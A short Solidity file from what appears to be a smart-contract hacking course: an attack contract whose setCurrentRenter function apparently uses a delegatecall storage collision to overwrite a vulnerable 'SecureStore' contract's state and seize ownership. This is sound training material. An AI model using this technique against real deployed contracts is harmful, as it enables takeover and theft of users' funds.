// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/access/Ownable.sol";

contract AttackSecureStore is Ownable {
    uint256 public currentRenter;
    address ownerStore;

    function setCurrentRenter(uint256) public {
        currentRenter = uint256(uint160(address(this)));
        ownerStore = owner();
    }
}
